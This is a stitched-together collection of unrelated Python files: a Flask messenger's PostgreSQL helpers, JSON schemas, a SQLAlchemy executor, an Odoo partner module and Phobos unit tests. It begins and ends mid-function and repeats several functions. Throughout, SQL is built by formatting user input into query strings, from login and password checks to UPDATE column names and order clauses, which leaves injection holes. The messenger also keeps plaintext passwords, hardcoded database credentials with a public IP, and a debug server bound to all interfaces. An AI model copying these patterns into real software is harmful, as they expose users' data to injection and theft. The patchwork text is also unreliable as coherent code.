        WHERE user_id='{:d}';
        DELETE FROM users
        WHERE id='{:d}';
    '''.format(ID, ID)
    sql_execute(sql, fetch_all=True)
    return {'status': 1}


def db_getProfileInfo(ID):
    sql='''
        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked
        FROM users
        WHERE id='{:d}';
    '''.format(ID)
    return sql_execute(sql, fetch_all=False)


def db_getProfilesInfo():
    sql='''
        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked
        FROM users;
    '''
    return sql_execute(sql, fetch_all=True)


def db_updateProfileInfo(ID, data):
    rows = []
    for key in data:
        if not key in ('first_name', 'second_name'):
            return {'status': 0, 'message': '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ –ø–æ–ª–µ. –ú–µ–Ω—è—Ç—å –º–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ first_name/second_name'}

        if data[key]:
            sql='''
                SELECT first_name, second_name
                FROM users
                WHERE id='{:d}'
            '''.format(ID)
            answer = sql_execute(sql, fetch_all=False)

            if data[key] == answer[key]: # –ï—Å–ª–∏ –≤–≤–µ–¥—ë–Ω–Ω–æ–µ –∏ –∏–∑ –ë–î –ø–æ–ª—è —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç—ã, —Ç–æ –≤—ã–∫–∏–¥—ã–≤–∞–µ–º –æ—à–∏–±–∫—É.
                rows.append(key)
                continue

            sql = '''
                UPDATE users
                SET {}='{}' 
                WHERE id='{:d}';
            '''.format(key, data[key], ID)
            sql_execute(sql, fetch_all=False)

    if not len(rows):
        return {'status': 1}
    elif len(rows) >= 1:
        return {'status': 1, 'message': '–≠–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω–æ–µ –ø–æ–ª–µ {} –Ω–µ –±—ã–ª–æ –∏–∑–º–µ–Ω–µ–Ω–æ'.format(rows)}
    else:
        return {'status': 0, 'message': '–≠–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω—ã–µ –ø–æ–ª—è {} –Ω–µ –±—ã–ª–∏ –∏–∑–º–µ–Ω–µ–Ω—ã'.format(rows)}


from flask import Flask

app = Flask(__name__, static_url_path='')

# Parse Flask configuration
from config import CONFIGURATION
app.config.from_object(CONFIGURATION)

#  Auth Manager
from modules.AuthManager.routes import auth_module
app.register_blueprint(auth_module)

#  Profile Manager
from modules.ProfileManager.routes import profile_module
app.register_blueprint(profile_module, url_prefix='/profile')

#  Messages Manager
from MessagesManager.routes import messages_module                    
app.register_blueprint(messages_module, url_prefix='/chat')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)

from database import sql_execute

## DEVELOP METHODS
def db_addProfile(data):
    sql='''
        INSERT INTO users (first_name, second_name, created_at, last_visit, is_blocked, is_online, is_deleted) 
        VALUES ('{first_name}', '{second_name}', NOW(), NOW(), false, true, false) RETURNING id;
    '''.format(**data)
    user_id = sql_execute(sql, fetch_all=True)
    sql = """
        INSERT INTO authentications (user_id, login, password) 
        VALUES ('{:d}', '{login}', '{password}');
    """.format(user_id[0]['id'], **data)
    sql_execute(sql, fetch_all=False)
    return {'status': 1}


def db_isAuthDataValid(data):
    print(data)
    sql='''
        SELECT user_id
        FROM authentications
        WHERE login='{login}' AND password='{password}';
    '''.format(**data)
    answer = sql_execute(sql, fetch_all=False)
    return answer is not None

    #return bool(answer['user_id'])


def db_isProfileExists(data):
    sql = "SELECT count(login) FROM authentications "

    if type(data) == int:
        sql += "WHERE user_id='{:d}';".format(data)                    
    elif type(data) == dict:
        sql += "WHERE login='{login}';".format(**data)                    


    users = sql_execute(sql, fetch_all=False)['count']
    return bool(users)


def db_setLastVisit(ID):
    sql='''
        UPDATE users
        SET last_visit = NOW()
        WHERE id='{:d}';
    '''.format(ID)
    sql_execute(sql, fetch_all=False)


""" 
# –§—É–Ω–∫—Ü–∏—è –±–ª–æ–∫–∏—Ä—É–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. 
–ü–æ –¥–µ—Ñ–æ–ª—Ç—É —Å—Ç–æ–∏—Ç True, –ø–æ—ç—Ç–æ–º—É –∞—Ä–≥—É–º–µ–Ω—Ç status –º–æ–∂–Ω–æ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å. 
–ï—Å–ª–∏ –ø–µ—Ä–µ–¥–∞—Ç—å False, —Ç–æ —Ä–∞–∑–±–ª–æ–∫–∏—Ä—É–µ—Ç.
"""
def db_blockProfile(ID, status=True):
    sql='''
        UPDATE users
        SET is_blocked='{}'
        WHERE id='{:d}';
    '''.format(status, ID)
    sql_execute(sql, fetch_all=False)



def db_getUserID(data):
    sql='''
        SELECT user_id
        FROM authentications
        WHERE login='{login}';
    '''.format(**data)
    user_id = sql_execute(sql, fetch_all=False)
    return user_id['user_id']




## PUBLIC METHODS
""" 
# –§—É–Ω–∫—Ü–∏—è —É–¥–∞–ª—è–µ—Ç –ø—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. 
–ü–æ –¥–µ—Ñ–æ–ª—Ç—É —Å—Ç–æ–∏—Ç True, –ø–æ—ç—Ç–æ–º—É –∞—Ä–≥—É–º–µ–Ω—Ç status –º–æ–∂–Ω–æ –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å. 
–ï—Å–ª–∏ –ø–µ—Ä–µ–¥–∞—Ç—å False, —Ç–æ –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç.
"""
def db_delProfile(ID, status=True):
    # TODO: –î–æ–±–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    sql='''
        UPDATE users 
        SET is_deleted='{}'
        WHERE id='{:d}';
    '''.format(status, ID)
    return sql_execute(sql, fetch_all=True)


def db_FullDelProfile(ID):
    # TODO: –î–æ–±–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å –Ω–∞ —É–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    sql='''
        DELETE FROM authentications
        WHERE user_id='{:d}';
        DELETE FROM users
        WHERE id='{:d}';
    '''.format(ID, ID)
    sql_execute(sql, fetch_all=True)
    return {'status': 1}


def db_getProfileInfo(ID):
    sql='''
        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked
        FROM users
        WHERE id='{:d}';
    '''.format(ID)
    return sql_execute(sql, fetch_all=False)


def db_getProfilesInfo():
    sql='''
        SELECT first_name, second_name, id, last_visit, is_deleted, is_blocked
        FROM users;
    '''
    return sql_execute(sql, fetch_all=True)


def db_updateProfileInfo(ID, data):
    rows = []
    for key in data:
        if not key in ('first_name', 'second_name'):
            return {'status': 0, 'message': '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ –ø–æ–ª–µ. –ú–µ–Ω—è—Ç—å –º–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ first_name/second_name'}

        if data[key]:
            sql='''
                SELECT first_name, second_name
                FROM users
                WHERE id='{:d}'
            '''.format(ID)
            answer = sql_execute(sql, fetch_all=False)

            if data[key] == answer[key]: # –ï—Å–ª–∏ –≤–≤–µ–¥—ë–Ω–Ω–æ–µ –∏ –∏–∑ –ë–î –ø–æ–ª—è —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç—ã, —Ç–æ –≤—ã–∫–∏–¥—ã–≤–∞–µ–º –æ—à–∏–±–∫—É.
                rows.append(key)
                continue

            sql = '''
                UPDATE users
                SET {}='{}' 
                WHERE id='{:d}';
            '''.format(key, data[key], ID)
            sql_execute(sql, fetch_all=False)

    if not len(rows):
        return {'status': 1}
    elif len(rows) >= 1:
        return {'status': 1, 'message': '–≠–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω–æ–µ –ø–æ–ª–µ {} –Ω–µ –±—ã–ª–æ –∏–∑–º–µ–Ω–µ–Ω–æ'.format(rows)}
    else:
        return {'status': 0, 'message': '–≠–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω—ã–µ –ø–æ–ª—è {} –Ω–µ –±—ã–ª–∏ –∏–∑–º–µ–Ω–µ–Ω—ã'.format(rows)}


login_schema = {
    'type': 'object',
    'properties': {
        'login': {'type': 'string'},                    
        'password': {'type': 'string'}
    },
    'required': ['login', 'password']
}


register_schema = {
    'type': 'object',
    'properties': {
        'login': {'type': 'string'},                    
        'password': {'type': 'string'},                    
        'first_name': {'type': 'string'},                    
        'second_name': {'type': 'string'}                    
    },
    'required': ['login', 'password', 'first_name', 'second_name']
}


profile_update_schema = {
    'type': 'object',
    'properties': {
        'first_name': {'type': 'string'},                    
        'second_name': {'type': 'string'}                    
    },
    'required': ['first_name', 'second_name']
}


conference_create_schema = {
    'type': 'object',
    'properties': {
        'name': {'type': 'string'},
    },
    'required': ['name']
}

conference_send_schema = {
    'type': 'object',
    'properties': {
        'name': {'type': 'string'},
    },
    'required': ['name']
}

import psycopg2
from psycopg2.extras import RealDictCursor

def sql_execute(query, fetch_all=True):                    
    conn = psycopg2.connect(dbname='messenger_1', user='messenger_1', password='messenger_1', host='90.189.168.29')
    cursor = conn.cursor(cursor_factory=RealDictCursor)

    answer = None
    cursor.execute(query)
    conn.commit()
    try:
        if fetch_all:
            answer = cursor.fetchall()
        else:
            answer = cursor.fetchone()
    except psycopg2.Error as err:
        return {'error': err}                    
    finally:
        cursor.close()
        conn.close()
        return answer

login_schema = {
    'type': 'object',
    'properties': {
        'login': {'type': 'string'},                    
        'password': {'type': 'string'}                    
    },
    'required': ['login', 'password']
}


register_schema = {
    'type': 'object',
    'properties': {
        'login': {'type': 'string', 'pattern': '\w+'},
        'password': {'type': 'string', 'pattern': '\w+'},
        'first_name': {'type': 'string', 'pattern': '\w+'},
        'second_name': {'type': 'string', 'pattern': '\w+'}
    },
    'required': ['login', 'password', 'first_name', 'second_name']
}


profile_update_schema = {
    'type': 'object',
    'properties': {
        'first_name': {'type': 'string'},                    
        'second_name': {'type': 'string'}                    
    },
    'required': ['first_name', 'second_name']
}


conference_create_schema = {
    'type': 'object',
    'properties': {
        'name': {'type': 'string'},
    },
    'required': ['name']
}

conference_send_schema = {
    'type': 'object',
    'properties': {
        'name': {'type': 'string'},
    },
    'required': ['name']
}

import json
import jsonschema

def json_validate(data_source, schema):
    try:
        data = json.loads(data_source)
        jsonschema.validate(data, schema)
        return data
    except (jsonschema.exceptions.ValidationError, json.decoder.JSONDecodeError) as err:
        print(err)
        return {'status': -1, 'message': '–ù–∞–π–¥–µ–Ω—ã –æ—à–∏–±–∫–∏ –≤ JSON\'–µ'}                    

from sqlalchemy import create_engine
from sqlalchemy.pool import StaticPool

from .serializer import make_row_serializable
from .cache import Cache
from .connection_url import is_sqlite


class QueryResult:
    def __init__(self, keys, rows):
        self.has_rows = rows is not None
        self.keys = keys
        self.rows = rows

    @classmethod
    def from_sqlalchemy_result(cls, result):
        if result.returns_rows:
            keys = result.keys()
            rows = [make_row_serializable(row) for row in result]
            return cls(keys, rows)
        else:
            return cls(None, None)


class Executor:
    def __init__(self):
        self._sqlite_engine_cache = Cache()

    def get_table_names(self, connection_url):
        engine = self._get_engine(connection_url)
        return engine.table_names()

    def execute_query(self, connection_url, query):
        engine = self._get_engine(connection_url)
        result = self._execute_with_engine(engine, query)
        return QueryResult.from_sqlalchemy_result(result)

    def get_table_summary(self, connection_url, table_name):
        # TODO check table_name is a valid SQL table
        query = "select * from {} limit 10000".format(table_name)                    
        return self.execute_query(connection_url, query)

    def _get_engine(self, connection_url):
        if is_sqlite(connection_url):
            engine = self._sqlite_engine_cache.get_or_set(
                connection_url,
                lambda: self._create_sqlite_engine(connection_url),
            )
        else:
            engine = create_engine(connection_url)
        return engine

    def _create_sqlite_engine(self, connection_url):
        engine = create_engine(
            connection_url,
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        return engine

    def _execute_with_engine(self, engine, query):
        connection = engine.connect()
        result = connection.execution_options(no_parameters=True).execute(
            query
        )
        return result

# -*- coding: utf-8 -*-
##############################################################################
#
#    Copyright (C) 2014 Compassion CH (http://www.compassion.ch)
#    Releasing children from poverty in Jesus' name
#    @author: Emanuel Cino <ecino@compassion.ch>
#
#    The licence is in the file __manifest__.py
#
##############################################################################
import logging
import tempfile
import uuid

from odoo import api, registry, fields, models, _
from odoo.tools import mod10r
from odoo.tools.config import config
from odoo.addons.base_geoengine.fields import GeoPoint
from odoo.addons.base_geoengine import fields as geo_fields

# fields that are synced if 'use_parent_address' is checked
ADDRESS_FIELDS = [
    'street', 'street2', 'street3', 'zip', 'city', 'state_id', 'country_id']

logger = logging.getLogger(__name__)

try:
    import pyminizip
    import csv
    from smb.SMBConnection import SMBConnection
    from smb.smb_structs import OperationFailure
except ImportError:
    logger.warning("Please install python dependencies.", exc_info=True)


class ResPartner(models.Model):
    """ This class upgrade the partners to match Compassion needs.
        It also synchronize all changes with the MySQL server of GP.
    """
    _inherit = 'res.partner'

    def _get_receipt_types(self):
        """ Display values for the receipt selection fields. """
        return [
            ('no', _('No receipt')),
            ('default', _('Default')),
            ('only_email', _('Only email')),
            ('paper', _('On paper'))]

    ##########################################################################
    #                        NEW PARTNER FIELDS                              #
    ##########################################################################
    lang = fields.Selection(default=False)
    total_invoiced = fields.Monetary(groups=False)
    street3 = fields.Char("Street3", size=128)
    invalid_mail = fields.Char("Invalid mail")
    church_unlinked = fields.Char(
        "Church (N/A)",
        help="Use this field if the church of the partner"
             " can not correctly be determined and linked.")
    deathdate = fields.Date('Death date', track_visibility='onchange')
    nbmag = fields.Integer('Number of Magazines', size=2,
                           required=True, default=1)
    tax_certificate = fields.Selection(
        _get_receipt_types, required=True, default='default')
    thankyou_letter = fields.Selection(
        _get_receipt_types, 'Thank you letter',
        required=True, default='default')
    calendar = fields.Boolean(
        help="Indicates if the partner wants to receive the Compassion "
             "calendar.", default=True)
    christmas_card = fields.Boolean(
        help="Indicates if the partner wants to receive the "
             "christmas card.", default=True)
    birthday_reminder = fields.Boolean(
        help="Indicates if the partner wants to receive a birthday "
             "reminder of his child.", default=True)
    photo_delivery_preference = fields.Selection(
        selection='_get_delivery_preference',
        default='both',
        required=True,
        help='Delivery preference for Child photo')

    partner_duplicate_ids = fields.Many2many(
        'res.partner', 'res_partner_duplicates', 'partner_id',
        'duplicate_id', readonly=True)

    advocate_details_id = fields.Many2one(
        'advocate.details', 'Advocate details', copy=False)
    engagement_ids = fields.Many2many(
        'advocate.engagement', related='advocate_details_id.engagement_ids'
    )
    other_contact_ids = fields.One2many(string='Linked Partners',
                                        domain=['|', ('active', '=', False),
                                                ('active', '=', True)])
    state = fields.Selection([
        ('pending', 'Waiting for validation'),
        ('active', 'Active')
    ], default='active', track_visibility='onchange')

    email_copy = fields.Boolean(string='CC e-mails sent to main partner')
    type = fields.Selection(selection_add=[
        ('email_alias', 'Email alias')
    ])

    uuid = fields.Char(default=lambda self: self._get_uuid(), copy=False,
                       index=True)

    has_agreed_child_protection_charter = fields.Boolean(
        help="Indicates if the partner has agreed to the child protection"
             "charter.", default=False)
    date_agreed_child_protection_charter = fields.Datetime(
        help="The date and time when the partner has agreed to the child"
             "protection charter."
    )
    geo_point = geo_fields.GeoPoint(copy=False)

    # add track on fields from module base
    email = fields.Char(track_visibility='onchange')
    title = fields.Many2one(track_visibility='onchange')
    lang = fields.Selection(track_visibility='onchange')
    # module from partner_firstname
    firstname = fields.Char(track_visibility='onchange')
    lastname = fields.Char(track_visibility='onchange')
    # module mail
    opt_out = fields.Boolean(track_visibility='onchange')

    ##########################################################################
    #                             FIELDS METHODS                             #
    ##########################################################################
    def _get_uuid(self):
        return str(uuid.uuid4())

    @api.multi
    def agree_to_child_protection_charter(self):
        return self.write({
            'has_agreed_child_protection_charter': True,
            'date_agreed_child_protection_charter': fields.Datetime.now()
        })

    @api.multi
    def validate_partner(self):
        return self.write({
            'state': 'active'
        })

    @api.multi
    def get_unreconciled_amount(self):
        """Returns the amount of unreconciled credits in Account 1050"""
        self.ensure_one()
        mv_line_obj = self.env['account.move.line']
        move_line_ids = mv_line_obj.search([
            ('partner_id', '=', self.id),
            ('account_id.code', '=', '1050'),
            ('credit', '>', '0'),
            ('full_reconcile_id', '=', False)])
        res = 0
        for move_line in move_line_ids:
            res += move_line.credit
        return res

    @api.multi
    def update_number_sponsorships(self):
        """
        Update the sponsorship number for the related church as well.
        """
        return super(
            ResPartner,
            self + self.mapped('church_id')).update_number_sponsorships()

    ##########################################################################
    #                              ORM METHODS                               #
    ##########################################################################
    @api.model
    def create(self, vals):
        """
        Lookup for duplicate partners and notify.
        """
        email = vals.get('email')
        if email:
            vals['email'] = email.strip()
        duplicate = self.search(
            ['|',
             '&',
             ('email', '=', vals.get('email')),
             ('email', '!=', False),
             '&', '&',
             ('firstname', 'ilike', vals.get('firstname')),
             ('lastname', 'ilike', vals.get('lastname')),
             ('zip', '=', vals.get('zip'))
             ])
        duplicate_ids = [(4, itm.id) for itm in duplicate]
        vals.update({'partner_duplicate_ids': duplicate_ids})
        vals['ref'] = self.env['ir.sequence'].get('partner.ref')
        # Never subscribe someone to res.partner record
        partner = super(ResPartner, self.with_context(
            mail_create_nosubscribe=True)).create(vals)
        partner.compute_geopoint()
        if partner.contact_type == 'attached' and not vals.get('active'):
            partner.active = False

        return partner

    @api.multi
    def write(self, vals):
        email = vals.get('email')
        if email:
            vals['email'] = email.strip()
        res = super(ResPartner, self).write(vals)
        if set(('country_id', 'city', 'zip')).intersection(vals):
            self.geo_localize()
            self.compute_geopoint()
        return res

    @api.model
    def name_search(self, name, args=None, operator='ilike', limit=80):
        """Extends to use trigram search."""
        if args is None:
            args = []
        if name:
            # First find by reference
            res = self.search([('ref', 'like', name)], limit=limit)
            if not res:
                res = self.search(
                    ['|', ('name', '%', name), ('name', 'ilike', name)],
                    order=u"similarity(res_partner.name, '%s') DESC" % name,
                    limit=limit)
            # Search by e-mail
            if not res:
                res = self.search([('email', 'ilike', name)], limit=limit)
        else:
            res = self.search(args, limit=limit)
        return res.name_get()

    @api.model
    def search(self, args, offset=0, limit=None, order=None, count=False):
        """ Order search results based on similarity if name search is used."""
        fuzzy_search = False
        for arg in args:
            if arg[0] == 'name' and arg[1] == '%':
                fuzzy_search = arg[2]
                break
        if fuzzy_search:
            order = u"similarity(res_partner.name, '%s') DESC" % fuzzy_search                    
        return super(ResPartner, self).search(
            args, offset, limit, order, count)

    ##########################################################################
    #                             ONCHANGE METHODS                           #
    ##########################################################################
    @api.onchange('lastname', 'firstname', 'zip', 'email')
    def _onchange_partner(self):
        if ((self.lastname and self.firstname and self.zip) or self.email)\
                and self.contact_type != 'attached':
            partner_duplicates = self.search([
                ('id', '!=', self._origin.id),
                '|',
                '&',
                ('email', '=', self.email),
                ('email', '!=', False),
                '&', '&',
                ('firstname', 'ilike', self.firstname),
                ('lastname', 'ilike', self.lastname),
                ('zip', '=', self.zip)
            ])
            if partner_duplicates:
                self.partner_duplicate_ids = partner_duplicates
                # Commit the found duplicates
                with api.Environment.manage():
                    with registry(self.env.cr.dbname).cursor() as new_cr:
                        new_env = api.Environment(new_cr, self.env.uid, {})
                        self._origin.with_env(new_env).write({
                            'partner_duplicate_ids': [(6, 0,
                                                       partner_duplicates.ids)]
                        })
                return {
                    'warning': {
                        'title': _("Possible existing partners found"),
                        'message': _('The partner you want to add may '
                                     'already exist. Please use the "'
                                     'Check duplicates" button to review it.')
                    },
                }

    ##########################################################################
    #                             PUBLIC METHODS                             #
    ##########################################################################
    @api.multi
    def compute_geopoint(self):
        """ Compute geopoints. """
        self.filtered(lambda p: not p.partner_latitude or not
                      p.partner_longitude).geo_localize()
        for partner in self.filtered(lambda p: p.partner_latitude and
                                     p.partner_longitude):
            geo_point = GeoPoint.from_latlon(
                self.env.cr,
                partner.partner_latitude,
                partner.partner_longitude)
            vals = {'geo_point': geo_point.wkt}
            partner.write(vals)
            partner.advocate_details_id.write(vals)
        return True

    @api.multi
    def generate_bvr_reference(self, product):
        """
        Generates a bvr reference for a donation to the fund given by
        the product.
        :param product: fund product with a fund_id
        :return: bvr reference for the partner
        """
        self.ensure_one()
        if isinstance(product, int):
            product = self.env['product.product'].browse(product)
        ref = self.ref
        bvr_reference = '0' * (9 + (7 - len(ref))) + ref
        bvr_reference += '0' * 5
        bvr_reference += '6'    # Fund donation
        bvr_reference += '0' * (4 - len(str(product.fund_id))) + str(
            product.fund_id)
        if len(bvr_reference) == 26:
            return mod10r(bvr_reference)

    ##########################################################################
    #                             VIEW CALLBACKS                             #
    ##########################################################################
    @api.multi
    def onchange_type(self, is_company):
        """ Put title 'Friends of Compassion for companies. """
        res = super(ResPartner, self).onchange_type(is_company)
        if is_company:
            res['value']['title'] = self.env.ref(
                'partner_compassion.res_partner_title_friends').id
        return res

    @api.model
    def get_lang_from_phone_number(self, phone):
        record = self.env['phone.common'].get_record_from_phone_number(phone)
        if record:
            partner = self.browse(record[1])
        return record and partner.lang

    @api.multi
    def forget_me(self):
        # Store information in CSV, inside encrypted zip file.
        self._secure_save_data()

        super(ResPartner, self).forget_me()
        # Delete other objects and custom CH fields
        self.write({
            'church_id': False,
            'church_unlinked': False,
            'street3': False,
            'firstname': False,
            'deathdate': False,
            'geo_point': False,
            'partner_latitude': False,
            'partner_longitude': False
        })
        self.advocate_details_id.unlink()
        self.survey_inputs.unlink()
        self.env['mail.tracking.email'].search([
            ('partner_id', '=', self.id)]).unlink()
        self.env['auditlog.log'].search([
            ('model_id.model', '=', 'res.partner'),
            ('res_id', '=', self.id)
        ]).unlink()
        self.env['partner.communication.job'].search([
            ('partner_id', '=', self.id)
        ]).unlink()
        self.message_ids.unlink()
        return True

    @api.multi
    def open_duplicates(self):
        partner_wizard = self.env['res.partner.check.double'].create({
            'partner_id': self.id,
        })
        return {
            "type": "ir.actions.act_window",
            "res_model": "res.partner.check.double",
            "res_id": partner_wizard.id,
            "view_type": "form",
            "view_mode": "form",
            "target": "new",
        }

    ##########################################################################
    #                             PRIVATE METHODS                            #
    ##########################################################################
    @api.model
    def _address_fields(self):
        """ Returns the list of address fields that are synced from the parent
        when the `use_parent_address` flag is set. """
        return list(ADDRESS_FIELDS)

    def _secure_save_data(self):
        """
        Stores partner name and address in a CSV file on NAS,
        inside a password-protected ZIP file.
        :return: None
        """
        smb_conn = self._get_smb_connection()
        if smb_conn and smb_conn.connect(SmbConfig.smb_ip, SmbConfig.smb_port):
            config_obj = self.env['ir.config_parameter']
            share_nas = config_obj.get_param('partner_compassion.share_on_nas')
            store_path = config_obj.get_param('partner_compassion.store_path')
            src_zip_file = tempfile.NamedTemporaryFile()
            attrs = smb_conn.retrieveFile(share_nas, store_path, src_zip_file)
            file_size = attrs[1]
            if file_size:
                src_zip_file.flush()
                zip_dir = tempfile.mkdtemp()
                pyminizip.uncompress(
                    src_zip_file.name, SmbConfig.file_pw, zip_dir, 0)
                csv_path = zip_dir + '/partner_data.csv'
                with open(csv_path, 'ab') as csv_file:
                    csv_writer = csv.writer(csv_file)
                    csv_writer.writerow([
                        str(self.id), self.ref, self.contact_address,
                        fields.Date.today()
                    ])
                dst_zip_file = tempfile.NamedTemporaryFile()
                pyminizip.compress(
                    csv_path, '', dst_zip_file.name, SmbConfig.file_pw, 5)
                try:
                    smb_conn.storeFile(share_nas, store_path, dst_zip_file)
                except OperationFailure:
                    logger.error(
                        "Couldn't store secure partner data on NAS. "
                        "Please do it manually by replicating the following "
                        "file: " + dst_zip_file.name)

    def _get_smb_connection(self):
        """" Retrieve configuration SMB """
        if not (SmbConfig.smb_user and SmbConfig.smb_pass and
                SmbConfig.smb_ip and SmbConfig.smb_port):
            return False
        else:
            return SMBConnection(
                SmbConfig.smb_user, SmbConfig.smb_pass, 'odoo', 'nas')

    def _get_active_sponsorships_domain(self):
        """
        Include sponsorships of church members
        :return: search domain for recurring.contract
        """
        domain = super(ResPartner, self)._get_active_sponsorships_domain()
        domain.insert(0, '|')
        domain.insert(3, ('partner_id', 'in', self.mapped('member_ids').ids))
        domain.insert(4, '|')
        domain.insert(6, ('correspondent_id', 'in', self.mapped(
            'member_ids').ids))
        return domain

    @api.model
    def _notify_prepare_email_values(self, message):
        """
        Always put reply_to value in mail notifications.
        :param message: the message record
        :return: mail values
        """
        mail_values = super(ResPartner,
                            self)._notify_prepare_email_values(message)

        # Find reply-to in mail template.
        base_template = None
        if message.model and self._context.get('custom_layout', False):
            base_template = self.env.ref(self._context['custom_layout'],
                                         raise_if_not_found=False)
        if not base_template:
            base_template = self.env.ref(
                'mail.mail_template_data_notification_email_default')

        if base_template.reply_to:
            mail_values['reply_to'] = base_template.reply_to

        return mail_values


class SmbConfig():
    """" Little class who contains SMB configuration """
    smb_user = config.get('smb_user')
    smb_pass = config.get('smb_pwd')
    smb_ip = config.get('smb_ip')
    smb_port = int(config.get('smb_port', 0))
    file_pw = config.get('partner_data_password')


#!/usr/bin/python

#
#  All rights reserved (c) 2014-2017 CEA/DAM.
#
#  This file is part of Phobos.
#
#  Phobos is free software: you can redistribute it and/or modify it under
#  the terms of the GNU Lesser General Public License as published by
#  the Free Software Foundation, either version 2.1 of the License, or
#  (at your option) any later version.
#
#  Phobos is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU Lesser General Public License for more details.
#
#  You should have received a copy of the GNU Lesser General Public License
#  along with Phobos. If not, see <http://www.gnu.org/licenses/>.
#

"""Unit tests for phobos.dss"""

import sys
import unittest
import os

from random import randint

from phobos.core.dss import Client
from phobos.core.ffi import MediaInfo, DevInfo
from phobos.core.const import dev_family2str, PHO_DEV_DIR                    


class DSSClientTest(unittest.TestCase):
    """
    This test case issue requests to the DSS to stress the python bindings.
    """

    def test_client_connect(self):
        """Connect to backend with valid parameters."""
        cli = Client()
        cli.connect()
        cli.disconnect()

    def test_client_connect_refused(self):
        """Connect to backend with invalid parameters."""
        cli = Client()
        environ_save = os.environ['PHOBOS_DSS_connect_string']
        os.environ['PHOBOS_DSS_connect_string'] = \
                "dbname='tata', user='titi', password='toto'"
        self.assertRaises(EnvironmentError, cli.connect)
        os.environ['PHOBOS_DSS_connect_string'] = environ_save

    def test_list_devices_by_family(self):
        """List devices family by family."""
        with Client() as client:
            for fam in ('tape', 'disk', 'dir'):
                for dev in client.devices.get(family=fam):
                    self.assertEqual(dev_family2str(dev.family), fam)

    def test_list_media(self):
        """List media."""
        with Client() as client:
            for mda in client.media.get():
                # replace with assertIsInstance when we drop pre-2.7 support
                self.assertTrue(isinstance(mda, MediaInfo))

    def test_getset(self):
        """GET / SET an object to validate the whole chain."""
        with Client() as client:
            insert_list = []
            for i in range(10):
                dev = DevInfo()
                dev.family = PHO_DEV_DIR
                dev.model = ''
                dev.path = '/tmp/test_%d' % randint(0, 1000000)
                dev.host = 'localhost'
                dev.serial = '__TEST_MAGIC_%d' % randint(0, 1000000)

                insert_list.append(dev)

            client.devices.insert(insert_list)

            # now retrieve them one by one and check serials
            for dev in insert_list:
                res = client.devices.get(serial=dev.serial)
                for retrieved_dev in res:
                    # replace with assertIsInstance when we drop pre-2.7 support
                    self.assertTrue(isinstance(retrieved_dev, dev.__class__))
                    self.assertEqual(retrieved_dev.serial, dev.serial)

            client.devices.delete(res)

    def test_manipulate_empty(self):
        """SET/DEL empty and None objects."""
        with Client() as client:
            client.devices.insert([])
            client.devices.insert(None)
            client.devices.delete([])
            client.devices.delete(None)

            client.media.insert([])
            client.media.insert(None)
            client.media.delete([])
            client.media.delete(None)

    def test_media_lock_unlock(self):
        """Test media lock and unlock wrappers"""
        with Client() as client:
            # Create a dummy media in db
            label = '/some/path_%d' % randint(0, 1000000)
            client.media.add(PHO_DEV_DIR, 'POSIX', None, label, locked=False)

            # Get the created media from db
            media = client.media.get(id=label)[0]

            # It should not be locked yet
            self.assertFalse(media.is_locked())

            # Lock it in db
            client.media.lock([media])

            # Media cannot be locked twice
            with self.assertRaises(EnvironmentError):
                client.media.lock([media])

            # Retrieve an up-to-date version
            media = client.media.get(id=label)[0]

            # This one should be locked
            self.assertTrue(media.is_locked())

            # Unlock it
            client.media.unlock([media])

            # Unlocking twice works
            client.media.unlock([media])

            # The up-to-date version isn't locked anymore
            media = client.media.get(id=label)[0]
            self.assertFalse(media.is_locked())


if __name__ == '__main__':
    unittest.main()


import json
import logging

from orm_cloud.configuration import Configuration
from orm_cloud.database_adapters.database_factory import DatabaseFactory
from orm_cloud.database_adapters.ms_sql_adapter import MsSqlAdapter


class DatabaseAdapter:
    log = logging.getLogger(__name__)

    def __init__(self, type, **kwargs):
        self._type = type
        self._db_params = kwargs

    def query(self, select, table, filter, sort_by=None, offset=None, limit=None, one_result=False):
        config = Configuration()
        db_info = config.db_info
        db_info_json = json.loads(db_info)

        self.log.debug('Creating {} database adapter...'.format(self._type))
        if self._type == 'pymssql':
            adapter = MsSqlAdapter()
        else:
            # invalid database
            raise RuntimeError('The database type {} is not available.'.format(self._type))

        sql = adapter.get_sql(select, table, filter, sort_by, offset, limit)                    
        self.log.debug('SQL is [{}].'.format(sql))

        database_factory = DatabaseFactory(self._type, hostname=db_info_json['host'], user=db_info_json['username'],
                                           password=db_info_json['password'], database=db_info_json['dbInstanceIdentifier'])
        connection = database_factory.get_connection()
        cursor = connection.cursor()

        cursor.execute(sql, None)                    
        r = [dict((cursor.description[i][0], value)
                  for i, value in enumerate(row)) for row in cursor.fetchall()]

        return (r[0] if r else None) if one_result else r













class LuceneParser:
    def __init__(self):
        pass

    def parse(self, lucene):
        # iterate through all fields and values in lucene query
        first = True
